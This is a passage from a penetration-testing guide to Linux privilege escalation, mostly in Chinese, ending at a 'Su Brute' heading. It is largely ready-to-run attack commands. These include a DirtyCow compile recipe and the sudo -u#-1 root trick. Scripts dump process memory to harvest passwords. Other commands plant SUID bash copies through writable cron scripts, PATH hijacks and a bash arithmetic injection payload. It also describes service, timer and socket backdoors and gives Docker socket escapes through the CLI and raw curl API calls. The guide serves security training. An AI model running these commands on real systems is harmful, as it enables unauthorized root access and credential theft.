# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### OS 信息

让我们开始获取有关正在运行操作系统的信息
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你**对 `PATH` 变量中的任何文件夹拥有写权限**，你可能能够劫持一些 libraries 或 binaries：
```bash
echo $PATH
```
### 环境信息

环境变量中是否有有趣的信息、密码或 API keys?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，并查看是否存在可用于 escalate privileges 的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个很好的易受攻击内核列表以及一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以这样做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可以帮助查找 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在受害者主机上执行，仅检查针对 kernel 2.x 的 exploits)

始终 **search the kernel version in Google**，可能你的内核版本已被写在某个 kernel exploit 中，这样你就能确定该 exploit 是否有效。

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受影响的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否易受攻击。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

在 1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户在从可被用户控制的目录使用 `/etc/nsswitch.conf` 文件时，通过 sudo 的 `--chroot` 选项将权限提升为 root。

下面有一个 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) 来 exploit 该 [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)。在运行 exploit 之前，请确认你的 `sudo` 版本易受影响并且支持 `chroot` 功能。

欲了解更多信息，请参考原始 [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB** 中的一个 **示例**，了解如何利用此 vuln。
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **what is mounted and unmounted**, 在哪里以及为什么。如果有任何未挂载的项，你可以尝试将其挂载并检查是否包含敏感信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的 binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
还要检查是否安装了 **any compiler is installed**。这在你需要使用某些 kernel exploit 时很有用，因为建议在你将要使用它的 machine（或在一台类似的 machine 上）上进行 compile。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查 **已安装软件包和服务的版本**。也许存在一些旧的 Nagios 版本（例如），可能被利用来提权……\
建议手动检查更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有 SSH 访问权限，你也可以使用 **openVAS** 来检查机器内安装的过时或易受攻击的软件。

> [!NOTE] > _请注意，这些命令会显示大量信息而大多无用，因此建议使用像 OpenVAS 或类似工具来检查已安装的软件版本是否存在已知漏洞_

## 进程

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **超过其应有的权限**（例如由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示了该进程的虚拟地址空间中内存的映射方式**；它还显示了**每个映射区域的权限**。该 **mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件中我们可以知道哪些**内存区域是可读的**及其偏移量。我们利用这些信息**在 mem 文件中定位并转储所有可读区域**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对来自 Sysinternals 套件的经典 ProcDump（用于 Windows）的 Linux 重新构想。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 要求并转储你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 来自进程内存的凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前面的章节以找到不同的方法来 dump the memory of a process），并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存窃取明文凭证**并从一些**常见文件**中获取凭证。它需要 root 权限才能正常工作。

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 计划/Cron jobs

### Crontab UI (alseambusher) 以 root 运行 – 基于 web 的 scheduler privesc

如果 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行并且仅绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它，并创建一个有特权的作业以进行提升。

典型流程
- 通过 `ss -ntlp` / `curl -v localhost:8000` 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm
- 在操作性工件中查找凭据：
  - 备份/脚本中含有 `zip -P <password>`
  - systemd 单元暴露了 `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录：
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限作业并立即运行（会生成 SUID shell）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
硬化
- 不要以 root 身份运行 Crontab UI；使用专用 user 并赋予最小权限进行限制
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅限 root 的 EnvironmentFile
- 为按需任务执行启用 audit/logging

检查是否有任何定期任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln？能修改 root 使用的文件吗？use symlinks？在 root 使用的目录中创建特定文件？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意用户 "user" 对 /home/user 拥有写权限_)

如果在这个 crontab 中 root 用户尝试在不设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\  
那么，你可以通过使用以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在命令中包含 “**\***”，你可以利用这一点做出意想不到的事情（例如 privesc）。示例:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 出现在像** _**/some/path/\***_ **这样的路径前面，它就不易受到攻击（就连** _**./\***_ **也不会）。**

有关更多 wildcard exploitation 技巧，请阅读以下页面：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 中的算术求值之前，会先进行 parameter expansion 和 command substitution。如果一个以 root 运行的 cron/parser 读取不受信任的日志字段并将它们送入算术上下文，攻击者可以注入一个 command substitution $(...)，在 cron 运行时以 root 身份执行。

- Why it works: 在 Bash 中，expansions 的顺序为：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。因此，像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（执行该命令），然后剩下的数字 `0` 被用于算术计算，使脚本继续而不报错。

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: 让攻击者可控的文本被写入被解析的日志，使得看起来像数字的字段包含一个 command substitution 并以数字结尾。确保你的命令不向 stdout 输出（或将其重定向），以保持算术有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改 cron script**（由 root 执行），你可以非常容易地得到一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用一个 **你有完全访问权限的 directory**，删除该文件夹并 **创建一个指向另一个包含你控制的 script 的 symlink 文件夹** 可能会有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监视进程，以查找每隔 1、2 或 5 分钟执行一次的进程。你可能可以利用它并 escalate privileges。

例如，要 **在 1 分钟内每 0.1s 监视一次**、**按较少执行的命令排序** 并删除执行次数最多的命令，你可以执行：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监控并列出每个启动的进程）。

### 隐藏的 cron jobs

可以通过在注释后放置一个 **carriage return**（而不是 newline character）来创建一个 cronjob，cron job 仍然会生效。示例（注意 carriage return char）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查你是否可以写入任何 `.service` 文件；如果可以，你 **可以修改它**，使其在服务 **启动**、**重启** 或 **停止** 时 **执行** 你的 **backdoor**（可能需要等到机器重启）。\
例如，使用 **`ExecStart=/tmp/script.sh`** 在 `.service` 文件中创建你的 backdoor

### 可写的服务二进制文件

请记住，如果你对被服务执行的二进制文件具有 **写权限**，你可以将它们更改为 backdoors，这样当服务被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以用以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现可以在路径的任何目录中 **write**，你可能能够 **escalate privileges**。你需要在服务配置文件中搜索使用 **relative paths being used on service configurations** 的情况，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你有写权限的 systemd PATH 文件夹中创建一个与相对路径二进制同名的 **可执行文件**，当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **后门将被执行**（非特权用户通常无法 start/stop 服务，但检查你是否可以使用 `sudo -l`）。

**通过 `man systemd.service` 了解更多关于服务的信息。**

## **计时器**

**计时器** 是以 `**.timer**` 结尾的 systemd 单元文件，用来控制 `**.service**` 文件或事件。**计时器** 可作为 cron 的替代方案，因为它们内置对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以用以下命令枚举所有计时器：
```bash
systemctl list-timers --all
```
### 可写的 timer 单元

如果你可以修改一个 timer，你就可以让它执行 systemd.unit 的某些现有单元（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是什么：

> 要在该 timer 到期时激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，该值默认为一个名称与 timer unit 相同但后缀不同的 service。（见上文。）建议被激活的 unit 名称和 timer unit 的 unit 名称除后缀外应相同。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），它正在**执行一个可写的二进制文件**
- 找到某个 systemd unit 正在**执行相对路径**，并且你对**systemd PATH**拥有**写权限**（以冒充该可执行文件）

通过 `man systemd.timer` 了解有关 timer 的更多信息。

### **启用定时器**

要启用一个定时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于**指示将在哪监听**该 socket（例如 AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果 **true**，则为每个传入连接**生成一个 service 实例**，并且只将连接 socket 传递给该实例。如果 **false**，所有监听 sockets 本身会**被传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。对于 datagram sockets 和 FIFOs，此值被忽略，在这些情况下单个 service 单元无条件处理所有传入流量。**默认值为 false**。出于性能原因，建议新守护进程以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，分别在监听的 **sockets**/FIFOs **创建并绑定之前**或**之后**执行。命令行的第一个 token 必须是绝对路径的文件名，后面跟随进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听的 **sockets**/FIFOs **关闭并移除之前**或**之后**执行的附加命令。
- `Service`: 指定在**接收到流量**时要**激活**的 service 单元名称。此设置只允许用于 `Accept=no` 的 sockets。默认值为与 socket 同名的 service（后缀已替换）。在大多数情况下不需要使用此选项。

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

注意可能存在一些**sockets listening for HTTP** 请求（_我不是在说 .socket files，而是那些充当 unix sockets 的文件_）。你可以用下面的命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **对 HTTP 请求有响应**，那么你可以**与它通信**，并可能**利用某些漏洞**。

### 可写的 Docker socket

Docker socket，通常位于 `/var/run/docker.sock`，是一个需要加固的关键文件。默认情况下，它对 `root` 用户和 `docker` 组的成员可写。拥有对该 socket 的写权限可能导致特权提升。下面是如何利用它以及在 Docker CLI 不可用时的替代方法的分解。

#### **Privilege Escalation with Docker CLI**

如果你有对 Docker socket 的写访问权限，可以使用以下命令提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 级别访问主机的文件系统。

#### **直接使用 Docker API**

在没有 Docker CLI 可用的情况下，仍然可以使用 Docker API 和 `curl` 命令来操纵 Docker socket。

1.  **List Docker Images:** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求创建一个将主机根目录挂载到容器中的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 与容器建立连接，从而在容器内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，你可以在容器中直接执行命令，从而以 root 级别访问主机的文件系统。

### Others

请注意，如果你对 docker socket 有写权限，因为你**属于 `docker` 组**，你会有[**更多权限提升的方法**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口监听**，你也可能能够对其进行攻破](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

查看 **更多从 docker 逃逸或滥用它以提升权限的方法** 在：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 权限提升

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 权限提升

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，使应用程序能够高效地交互和共享数据。它为现代 Linux 系统设计，提供了一个用于各种应用间通信的稳健框架。

该系统功能多样，支持基础的 IPC，以增强进程间的数据交换，类似于增强版的 UNIX domain sockets。它还支持广播事件或信号，促进系统组件之间的无缝集成。例如，蓝牙守护进程关于来电的信号可以促使音乐播放器静音，从而改进用户体验。此外，D-Bus 支持远程对象系统，简化应用间的服务请求和方法调用，使传统上复杂的流程变得更简单。

D-Bus 采用**允许/拒绝模型 (allow/deny model)**，基于匹配到的策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定了与总线的交互，可能通过滥用这些权限而导致权限提升。

下面给出 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的示例，说明了 root 用户对 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有人，而 “default” 上下文策略则适用于未被其他具体策略覆盖的所有情形。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此学习如何 enumerate 和 exploit D-Bus communication：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行 enumerate 并确定机器的位置通常很有价值。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在访问它之前你无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff traffic。如果可以，你可能能够获取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查**你是谁**、你拥有哪些**权限**、系统中有哪些**用户**、哪些可以**登录**、以及哪些拥有**root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

一些 Linux 版本受到一个 bug 的影响，允许 **UID > INT_MAX** 的用户提升权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用: **`systemd-run -t /bin/bash`**

### 组

检查你是否是 **某个组的成员**，该组可能授予你 root 权限：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容 (如果可能)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，**尝试使用该密码以每个用户身份登录**。

### Su Brute

